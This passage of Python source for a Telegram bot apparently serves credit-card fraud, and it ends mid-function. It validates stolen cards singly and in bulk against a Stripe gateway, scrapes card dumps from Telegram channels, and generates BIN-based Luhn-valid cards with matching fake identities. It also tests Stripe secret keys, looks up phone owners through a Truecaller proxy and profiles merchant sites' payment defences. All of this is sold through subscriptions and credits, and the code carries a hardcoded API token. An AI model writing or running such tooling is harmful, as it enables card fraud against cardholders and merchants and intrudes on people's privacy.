        # Count approved cards from HITS.txt
        approved = 0
        if os.path.exists("HITS.txt"):
            with open("HITS.txt", "r") as f:
                approved = len(f.readlines())

        declined = max(0, total_checks_today - approved)

        total_redeemed = sum(
            data.get("redeemed_credits", 0) for data in user_credits.values()
        )

        response = f"""
┏━━━━━━━⍟
┃ Bot Statics 
┗━━━━━━━━━━━⊛

✧ Total Users       ➳ <code>{total_users}</code>
✧ Subscribed Users  ➳ <code>{total_subscribed}</code>
✧ Checks Today      ➳ <code>{total_checks_today}</code>
✧ Approved Cards    ➳ <code>{approved}</code>
✧ Declined Cards    ➳ <code>{declined}</code>
✧ Redeemed Credits  ➳ <code>{total_redeemed}</code>
"""
        bot.reply_to(message, response.strip(), parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"Error fetching stats: <code>{str(e)}</code>", parse_mode='HTML')


@bot.message_handler(commands=['gate'])
def handle_gate_check(message):
    user_id = str(message.from_user.id)

    # Restrict usage in private DMs for non-subscribed users
    if message.chat.type == 'private' and user_id not in ADMIN_IDS and not is_user_subscribed(user_id):
        bot.reply_to(message, "❌ This bot is restricted in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return

    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.\nSend group username & chat ID to @SongPY to get approved.")
        return

    # Check for URL argument
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /gate <site_url>")
        return

    site_url = parts[1].strip().strip("<>")

    try:
        # Send initial message
        status_msg = bot.reply_to(message, f"Checking URL: <code>{site_url}</code>\nProgress: □□□□□ (0%)\nPlease wait...", parse_mode="HTML")

        # Simulate progress
        progress_steps = ["□□□□□ (0%)", "■□□□□ (20%)", "■■□□□ (40%)", "■■■□□ (60%)", "■■■■□ (80%)", "■■■■■ (100%)"]
        for step in progress_steps:
            try:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"Checking URL: <code>{site_url}</code>\nProgress: {step}\nPlease wait...",
                    parse_mode="HTML"
                )
                time.sleep(0.5)
            except Exception:
                pass

        # Call local Flask API
        api_url = f"http://127.0.0.1:4444/gatechk?site={site_url}"
        response = requests.get(api_url, timeout=20)

        if response.status_code != 200:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"❌ Failed to check the site.\nStatus Code: {response.status_code}\nResponse: {response.text[:200]}",
                parse_mode=None
            )
            return

        data = response.json()

        # Extract fields
        final_url = data.get("url", site_url)
        gateways = ", ".join(data.get("payment_gateways", ["N/A"]))
        captcha = ", ".join(data.get("captcha", ["N/A"]))
        cloudflare = data.get("cloudflare", "N/A")
        security = data.get("security", "N/A")
        cvv = data.get("cvv_cvc_status", "N/A")
        inbuilt = data.get("inbuilt_system", "N/A")
        status_code = data.get("status_code", "N/A")

        # Format result
        result_text = f"""
┏━━━━━━━⍟
┃ 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 ✅ 
┗━━━━━━━━━━━━⊛
✧ 𝗦𝗶𝘁𝗲 ➳ <code>{final_url}</code> 
✧ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➳ <code>{gateways}</code> 
✧ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 ➳ <code>{captcha}</code> 
✧ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 ➳ <code>{cloudflare}</code> 
✧ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➳ {security}
✧ 𝗖𝗩𝗩/𝗖𝗩𝗖 ➳ {cvv}
✧ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 ➳ {inbuilt}
✧ 𝗦𝘁𝗮𝘁𝘂𝘀 ➳ {status_code}
"""
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=result_text.strip(),
            parse_mode="HTML"
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Error occurred: <code>{str(e)}</code>", parse_mode="HTML")


@bot.message_handler(commands=['fake'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.fake'))
def handle_fake(message):
    # Restrict usage in DMs for non-subs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DMs. Join our group @stormxvup or subscribe to use it in private.")
        return

    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.\nSend @SongPY the group username and chat ID to get approved.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /fake <country_code>\nExample: /fake us, .fake in")
        return

    code = parts[1].strip().lower()

    # Match locale or fallback to US
    matched_locale = None
    for locale in AVAILABLE_LOCALES:
        if locale.lower().endswith(f"_{code}") or locale.lower() == code:
            matched_locale = locale
            break

    if not matched_locale:
        matched_locale = "en_US"
        code = "us"

    fake = Faker(matched_locale)

    try:
        name = fake.name()
        street = fake.street_address()
        city = fake.city()
        state = fake.state() if hasattr(fake, 'state') else "N/A"
        state_abbr = fake.state_abbr() if hasattr(fake, 'state_abbr') else "N/A"
        country = matched_locale.upper()
        zip_code = fake.postcode() if hasattr(fake, 'postcode') else "N/A"
        email = fake.email()
        phone = fake.phone_number()
        dob = fake.date_of_birth(minimum_age=18, maximum_age=60)
        company = fake.company()
        job = fake.job()
        ssn = fake.ssn() if hasattr(fake, 'ssn') else fake.bothify(text='???-##-####')
        ip = fake.ipv4()
        username = fake.user_name()
        password = fake.password(length=10, special_chars=True, digits=True, upper_case=True, lower_case=True)
        website = fake.url()
        address2 = fake.secondary_address() if hasattr(fake, 'secondary_address') else "N/A"
        device = fake.android_platform_token()
        user_agent = fake.user_agent()
        national_id = fake.bothify(text='##??##?####')
        cc_number = fake.credit_card_number()

        # PAN Number for Indian users
        pan_number = fake.bothify(text='?????####?').upper() if code == "in" else "N/A"

        msg = f"""
┏━━━━━━━⍟
┃ Fake Identity 
┗━━━━━━━━━━━⊛

✧ Name      ➳ <code>{name}</code>
✧ Street    ➳ <code>{street}</code>
✧ Address 2 ➳ <code>{address2}</code>
✧ City      ➳ <code>{city}</code>
✧ State     ➳ <code>{state}</code> (<code>{state_abbr}</code>)
✧ Country   ➳ <code>{country}</code>
✧ ZIP Code  ➳ <code>{zip_code}</code>

✧ Email     ➳ <code>{email}</code>
✧ Phone     ➳ <code>{phone}</code>
✧ DOB       ➳ <code>{dob}</code>
✧ Company   ➳ <code>{company}</code>
✧ Job Title ➳ <code>{job}</code>
✧ SSN/ID    ➳ <code>{ssn}</code>
✧ National ID ➳ <code>{national_id}</code>
✧ IP Address  ➳ <code>{ip}</code>

✧ Username  ➳ <code>{username}</code>
✧ Password  ➳ <code>{password}</code>
✧ Website   ➳ <code>{website}</code>

✧ Credit Card ➳ <code>{cc_number}</code>
✧ PAN Number  ➳ <code>{pan_number}</code>

✧ Device Name ➳ <code>{device}</code>
✧ User-Agent  ➳ <code>{user_agent}</code>
"""
        bot.reply_to(message, msg.strip(), parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ Error generating identity: {str(e)}")

# Handle both /addadmin and .addadmin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if str(message.from_user.id) != ADMIN_IDS[0]:  # Only owner
        return bot.reply_to(message, "❌ Only the bot owner can add admins.")

    parts = message.text.split()
    if len(parts) != 2:
        return bot.reply_to(message, "❌ Usage: /addadmin user_id")

    new_admin = parts[1]
    if new_admin in ADMIN_IDS:
        return bot.reply_to(message, f"⚠️ User <code>{new_admin}</code> is already an admin.", parse_mode='HTML')

    ADMIN_IDS.append(new_admin)
    save_admins()
    bot.reply_to(message, f"✅ Added <code>{new_admin}</code> as admin.", parse_mode='HTML')

@bot.message_handler(commands=['remadmin'])
def remove_admin(message):
    if str(message.from_user.id) != ADMIN_IDS[0]:  # Only owner
        return bot.reply_to(message, "❌ Only the bot owner can remove admins.")

    parts = message.text.split()
    if len(parts) != 2:
        return bot.reply_to(message, "❌ Usage: /remadmin user_id")

    target_admin = parts[1]
    if target_admin == ADMIN_IDS[0]:
        return bot.reply_to(message, "❌ You cannot remove the owner.")

    if target_admin not in ADMIN_IDS:
        return bot.reply_to(message, "❌ This user is not an admin.")

    ADMIN_IDS.remove(target_admin)
    save_admins()
    bot.reply_to(message, f"✅ Removed <code>{target_admin}</code> from admin list.", parse_mode='HTML')


@bot.message_handler(commands=['listsub'])
def list_subscribers(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        return bot.reply_to(message, "❌ You are not authorized to use this command.")

    if not SUBSCRIBED_USERS:
        return bot.reply_to(message, "❌ No active subscribers found.")

    msg = "<b>📋 Active Subscribers:</b>\n\n"

    for user_id, data in SUBSCRIBED_USERS.items():
        plan = data.get('plan', '❓')
        expiry = data.get('expiry', '❌')
        credits = USER_CREDITS.get(user_id, {}).get('credits', 0)
        total_redeemed = USER_CREDITS.get(user_id, {}).get('redeemed_credits', 0)

        msg += (
            f"👤 <code>{user_id}</code>\n"
            f"• Plan: {plan} | Expiry: {expiry}\n"
            f"• Credits: {credits} | Redeemed: {total_redeemed}\n\n"
        )

    bot.reply_to(message, msg, parse_mode='HTML')

@bot.message_handler(commands=['admins'])
def list_admins(message):
    if str(message.from_user.id) != "6052940395":
        bot.reply_to(message, "❌ Only the bot owner can see full admin list.")
        return

    if not ADMIN_IDS:
        bot.reply_to(message, "No admins found.")
        return

    admin_list = "\n".join([f"• <code>{uid}</code>" for uid in ADMIN_IDS])
    bot.reply_to(message, f"👮 Current Admins:\n\n{admin_list}", parse_mode="HTML")


def extract_ccs(text):
    cc_pattern = r'\b(?:\d[ -]*?){13,16}[|:/\- ]\d{1,2}[|:/\- ]\d{2,4}[|:/\- ]\d{3,4}\b'
    matches = re.findall(cc_pattern, text)
    cleaned = []

    for match in matches:
        nums = re.split(r'[|:/\- ]+', match)
        if len(nums) == 4:
            cc, mm, yy, cvv = nums
            if len(yy) == 2:
                yy = "20" + yy
            cleaned.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cleaned

@bot.message_handler(commands=['fl'])
def format_list(message):
    target_text = message.text

    # If replying to message, extract that instead
    if message.reply_to_message:
        target_text = message.reply_to_message.text

    ccs = extract_ccs(target_text)
    if not ccs:
        bot.reply_to(message, "❌ No valid CCs found.")
        return

    formatted = "\n".join(ccs)
    count = len(ccs)

    msg = f"✅ Extracted {count} card(s):\n\n<code>{formatted}</code>"
    bot.reply_to(message, msg, parse_mode="HTML")



@bot.message_handler(commands=['scr'])
@bot.message_handler(func=lambda message: message.text.startswith('.scr'))
def handle_scrape_cards(message):
    try:
        chat_id = message.chat.id
        from_id = str(message.from_user.id)

        # Restrict usage to:
        # → Subscribed users in DMs
        # → Approved groups
        if message.chat.type == "private":
            if from_id not in SUBSCRIBED_USERS:
                return bot.reply_to(message, "❌ This command is only for subscribed users in DM.")
        elif message.chat.type in ["group", "supergroup"]:
            if str(chat_id) not in APPROVED_GROUPS:
                return bot.reply_to(message, "❌ This group is not approved to use this command.")
        else:
            return bot.reply_to(message, "❌ This command is not allowed here.")

        # Parse args
        parts = message.text.split()
        if len(parts) != 3:
            return bot.reply_to(message, "❌ Usage: /scr username count\nExample: <code>/scr inkbins 100</code>", parse_mode='HTML')

        username = parts[1]
        try:
            count = int(parts[2])
        except ValueError:
            return bot.reply_to(message, "❌ Count must be a number.")

        if count > 5000:
            return bot.reply_to(message, "❌ Max card limit is 5000.")

        # "Please wait" status
        status_msg = bot.reply_to(message, "⏳ Scraping cards, please wait up to 2 minutes...")

        # API request
        url = f"http://127.0.0.1:2233/key=waslost/uname/{username}/{count}"
        response = requests.get(url, timeout=300)

        if response.status_code != 200:
            return bot.edit_message_text("❌ Failed to fetch data from the server.", chat_id=chat_id, message_id=status_msg.message_id)

        data = response.json()
        cc_list = data.get('cc_list', [])
        channel = data.get('channel', 'Unknown')
        total_found = data.get('total_found', 0)
        unique_ccs = data.get('unique_ccs', 0)
        duplicates = data.get('duplicates_found', 0)
        scraped = data.get('messages_scraped', 0)

        if not cc_list:
            return bot.edit_message_text("❌ No cards found.", chat_id=chat_id, message_id=status_msg.message_id)

        # Save cards to file
        filename = f"scraped_{username}_{from_id}.txt"
        with open(filename, 'w') as file:
            for cc in cc_list:
                file.write(cc + '\n')

        # Caption
        caption = (
            f"✅ <b>Scrape Complete</b>\n"
            f"👤 Username: <code>{username}</code>\n"
            f"📦 Cards: <b>{len(cc_list)}</b>\n"
            f"💬 Messages Scraped: <b>{scraped}</b>\n"
            f"♻️ Duplicates Removed: <b>{duplicates}</b>\n"
            f"🌐 Source: <code>{channel}</code>\n"
            f"🧮 Total Found: <b>{total_found}</b>\n"
            f"🆕 Unique CCs: <b>{unique_ccs}</b>"
        )

        # Send file
        with open(filename, 'rb') as doc:
            bot.send_document(
                chat_id=chat_id,
                document=doc,
                caption=caption,
                parse_mode='HTML',
                reply_to_message_id=message.message_id
            )

        os.remove(filename)
        bot.delete_message(chat_id=chat_id, message_id=status_msg.message_id)

    except Exception as e:
        try:
            bot.edit_message_text(f"❌ Error occurred: {str(e)}", chat_id=chat_id, message_id=status_msg.message_id)
        except:
            bot.reply_to(message, f"❌ Error occurred: {str(e)}")

def normalize_card_input(cc):
    parts = re.split(r'[|:/\- ]+', cc)
    if len(parts) < 4:
        raise ValueError("Invalid card format")
    card, mm, yy, cvv = parts[:4]
    if len(yy) == 2:
        yy = "20" + yy
    return f"{card}|{mm}|{yy}|{cvv}"


@bot.message_handler(commands=['au'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.au'))
def handle_au(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now.")
        return

    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands.")
        return

    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ No credits left. Remaining: {remaining}.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        cc = None
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) > 1:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        if not cc and message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            match = re.search(r'\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b', reply_text)
            if match:
                cc = match.group(0)

        if not cc:
            bot.reply_to(message, "❌ Format: /au CC|MM|YYYY|CVV or reply to a message with a card.")
            return

        cc = normalize_card_input(cc)

        start_time = time.time()
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe Auth 2</i>\n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_au_cc(cc)
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mass'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mass'))
def handle_mass(message):
    # Check if user is allowed to use the bot in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Confirm if the checker is active
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is currently inactive. Follow @Darkboy336 for updates!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Parse input cards
    try:
        cards_text = None
        command_parts = message.text.split()
        
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after the command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return

        # Determine maximum card limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")

        # Check user credits for non-subscribed users
        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for the daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))

        # Start processing cards
        start_time = time.time()
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')

        def check_cards():
            try:
                results = []
                for idx, card in enumerate(cards, 1):
                    try:
                        # Call the `check_au_cc` function to process each card
                        result = check_au_cc(card)
                        results.append(result)
                    except Exception as e:
                        results.append({
                            "status": "ERROR",
                            "card": card,
                            "message": str(e),
                            "brand": "UNKNOWN",
                            "country": "UNKNOWN 🌐",
                            "type": "UNKNOWN",
                            "gateway": "Stripe Auth 2"
                        })

                    # Update message in real-time
                    processing_time = time.time() - start_time
                    response_text = format_mchk_response(results, len(cards), processing_time, checked=idx)
                    bot.edit_message_text(chat_id=message.chat.id,
                                          message_id=status_msg.message_id,
                                          text=response_text,
                                          parse_mode='HTML')

                # Final update with all results
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time, checked=len(results))
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}",
                                      parse_mode='HTML')

        threading.Thread(target=check_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import WebDriverException
import os
import time
import requests
from telebot import types

@bot.message_handler(commands=['sc'])
def handle_screenshot(message):
    try:
        if len(message.text.split()) < 2:
            bot.reply_to(message, "⚠️ Please provide a URL.\nUsage: `/sc example.com`", parse_mode="Markdown")
            return

        url = message.text.split(" ", 1)[1].strip()
        if not url.startswith("http"):
            url = "http://" + url

        # Send waiting message
        msg = bot.reply_to(message, f"🖼️ Capturing screenshot of {url}...")

        # Setup Chrome options
        chrome_path = "/usr/bin/chromium-browser"
        chromedriver_path = "/usr/lib/chromium-browser/chromedriver"

        options = Options()
        options.binary_location = chrome_path
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1280x800")

        service = Service(chromedriver_path)
        driver = webdriver.Chrome(service=service, options=options)

        driver.get(url)
        time.sleep(3)

        # Get page title
        title = driver.title.strip()

        # Save screenshot
        timestamp = int(time.time())
        screenshot_path = f"screenshot_{timestamp}.png"
        driver.save_screenshot(screenshot_path)
        driver.quit()

        # Get response code
        try:
            response = requests.get(url, timeout=10)
            status_code = response.status_code
        except:
            status_code = "N/A"

        # Caption with info
        caption = f"🌐 *Website Info:*\n"
        caption += f"*Title:* `{title}`\n"
        caption += f"*URL:* `{url}`\n"
        caption += f"*Status:* `{status_code}`"

        # Send screenshot
        with open(screenshot_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo, caption=caption, parse_mode="Markdown")

        # Delete the old "Capturing..." message
        bot.delete_message(message.chat.id, msg.message_id)

        # Clean up
        os.remove(screenshot_path)

    except WebDriverException as we:
        bot.reply_to(message, f"❌ Selenium Error:\n`{str(we)}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to capture screenshot:\n`{str(e)}`", parse_mode="Markdown")



@bot.message_handler(commands=['dumpbin'])
def handle_dumpbin(message):
    try:
        # Parse input
        args = message.text.split(" ", 1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Usage: /dumpbin <bin>")
            return

        bin_input = args[1].strip().replace(" ", "")[:6]
        if not bin_input.isdigit() or len(bin_input) < 6:
            bot.reply_to(message, "❌ Invalid BIN. Provide 6-digit BIN.")
            return

        # Fetch BIN info
        bin_info = requests.get(f"https://bins.antipublic.cc/bins/{bin_input}").json()
        country_code = bin_info.get('country_code', 'US').lower()
        
        # Generate matching user data
        user_data = requests.get(f"https://randomuser.me/api/?nat={country_code}").json()['results'][0]
        
        # Generate PROPER 16-digit card details
        cc = generate_luhn_card_number(bin_input, 16)  # Ensure 16 digits
        month = f"{random.randint(1, 12):02d}"
        year = str(random.randint(2026, 2031))
        cvv = f"{random.randint(100, 999):03d}"
        
        # Format user details
        full_name = f"{user_data['name']['first']} {user_data['name']['last']}".upper()
        postcode = str(user_data['location']['postcode']) if isinstance(user_data['location']['postcode'], int) else user_data['location']['postcode'].get('large', '00000')
        
        response = f"""
💳 <code>{cc}|{month}|{year}|{cvv}</code>

👤 Name: <code>{full_name}</code>
🏦 Bank: <code>{bin_info.get('bank', 'Unknown')}</code>
🌍 Country: <code>{bin_info.get('country', 'Unknown')}</code>
🔐 Type: <code>{bin_info.get('brand', 'Unknown')}</code>

📧 Email: <code>{user_data['email']}</code>
📞 Phone: <code>{user_data.get('phone', user_data.get('cell', 'N/A'))}</code>

🏠 Street: <code>{user_data['location']['street']['number']} {user_data['location']['street']['name']}</code>
🏙️ City: <code>{user_data['location']['city']}</code>
🗺️ State/Province: <code>{user_data['location']['state']}</code>
📍 Zip: <code>{postcode}</code>
        """.strip()

        bot.reply_to(message, response, parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def generate_luhn_card_number(prefix, length=16):
    """Generate PROPER Luhn-valid card number with exact length"""
    # Generate random middle digits (excluding prefix and check digit)
    missing_digits = length - len(prefix) - 1
    if missing_digits <= 0:
        raise ValueError("Prefix too long for card number length")
    
    middle = ''.join(str(random.randint(0, 9)) for _ in range(missing_digits))
    partial = prefix + middle
    
    # Calculate Luhn check digit
    total = 0
    for i, digit in enumerate(partial):
        n = int(digit)
        if (len(partial) - i) % 2 == 0:  # Counting from the right (before check digit)
            n *= 2
            if n > 9: n -= 9
        total += n
    
    check_digit = (10 - (total % 10)) % 10
    return partial + str(check_digit)


@bot.message_handler(commands=['sk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sk'))
def handle_sk_check(message):
    # Check if the bot usage is allowed
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Check flood control
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands.")
        return

    try:
        # Parse input
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /sk <sk_key>")
            return
        sk_key = parts[1]

        # Notify user of processing
        status_msg = bot.reply_to(message, "🔍 Checking SK key...")

        # Define function to check SK key
        def check_sk():
            try:
                headers = {"Authorization": f"Bearer {sk_key}"}
                r = requests.get("https://api.stripe.com/v1/account", headers=headers, timeout=20)

                # Response formatting based on API response
                if r.status_code == 200:
                    data = r.json()
                    msg = f"""
┏━━━━━━━⍟
┃ SK Key Info
┗━━━━━━━━━━━⊛

✧ Name        : <code>{data.get("display_name", "N/A")}</code>
✧ Business    : <code>{data.get("business_name", "N/A")}</code>
✧ Website     : <code>{data.get("business_url", "N/A")}</code>
✧ Email       : <code>{data.get("email", "N/A")}</code>
✧ Country     : <code>{data.get("country", "N/A")}</code>
✧ Currency    : <code>{data.get("default_currency", "N/A").upper()}</code>
✧ Live Mode   : <code>{"✅" if data.get("livemode") else "❌"}</code>
✧ Status      : <b>✅ LIVE</b>
"""
                elif r.status_code == 401:
                    msg = f"""
┏━━━━━━━⍟
┃ SK Key Info
┗━━━━━━━━━━━⊛

✧ Status      : <b>❌ DEAD / INVALID</b>
✧ Checked Key : <code>{sk_key}</code>
"""
                else:
                    msg = f"""
┏━━━━━━━⍟
┃ SK Key Info
┗━━━━━━━━━━━⊛

✧ Status      : ⚠️ UNKNOWN ({r.status_code})
✧ Checked Key : <code>{sk_key}</code>
"""

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=msg.strip(),
                                      parse_mode='HTML')
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ Error checking key: <code>{str(e)}</code>",
                                      parse_mode="HTML")

        threading.Thread(target=check_sk).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


def get_truecaller_details(phone_number):
    formatted_number = phone_number if phone_number.startswith('+') else '+91' + phone_number

    truecaller_url = f"https://truecaller.jarelugu.workers.dev/?number={formatted_number}"
    clearout_url = "https://api.clearoutphone.io/v1/phonenumber/validate"
    clearout_token = "ccd95e9fa49159a72e8bdcdcb5f839ef:eae98d375a5d99ee9cd4e9ad0410d75f3877d72652083ef85915cb0942b30444"

    try:
        # Request to Truecaller API (old one)
        result = subprocess.run(
            ["curl", "-s", truecaller_url],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10
        )
        truecaller_output = result.stdout.decode("utf-8").strip()
        try:
            truecaller_data = json.loads(truecaller_output)
        except json.JSONDecodeError:
            truecaller_data = {"error": "Failed to parse Truecaller response"}

        # Request to ClearoutPhone API (new one)
        headers = {
            "Authorization": f"Bearer:{clearout_token}",
            "Content-Type": "application/json"
        }
        payload = {
            "number": formatted_number,
            "country_code": "IN"
        }
        clearout_response = requests.post(clearout_url, json=payload, headers=headers, timeout=10)
        clearout_data = clearout_response.json().get("data", {})

        # Merge both results
        merged = {
            "Truecaller": truecaller_data.get("Truecaller", "No name found"),
            "Unknown": truecaller_data.get("Unknown", "N/A"),
            "timestamp": truecaller_data.get("timestamp"),
            "telegram_id": truecaller_data.get("telegram_id"),
            "whatsapp_link": truecaller_data.get("whatsapp_link"),
            "carrier": clearout_data.get("carrier", "N/A"),
            "country": clearout_data.get("country_name", "N/A"),
            "international_format": clearout_data.get("international_format", "N/A"),
            "location": clearout_data.get("location", "N/A"),
            "timezones": clearout_data.get("timezone", [] if not isinstance(clearout_data.get("timezone"), list) else clearout_data.get("timezone")),
        }

        return merged

    except subprocess.TimeoutExpired:
        return {"error": "Truecaller request timed out"}
    except requests.RequestException as e:
        return {"error": f"Clearout API error: {str(e)}"}
    except Exception as e:
        return {"error": str(e)}


@bot.message_handler(commands=['true'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.true'))
def handle_truecaller_check(message):
    # Lock usage properly
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot. Send request to @Darkboy336 to approve your group.")
        return

    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Subscribe to remove limits.")
        return

    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /true <phone_number>")
            return

        phone_number = parts[1].strip()
        bot.send_chat_action(message.chat.id, 'typing')
        data = get_truecaller_details(phone_number)

        if "error" in data and not any(k in data for k in ["Truecaller", "Unknown"]):
            bot.reply_to(message, f"❌ Error: {data['error']}")
            return

        # Convert timestamp if available
        timestamp = data.get('timestamp')
        if timestamp and str(timestamp).isdigit():
            try:
                dt = datetime.fromtimestamp(int(timestamp) / 1000)
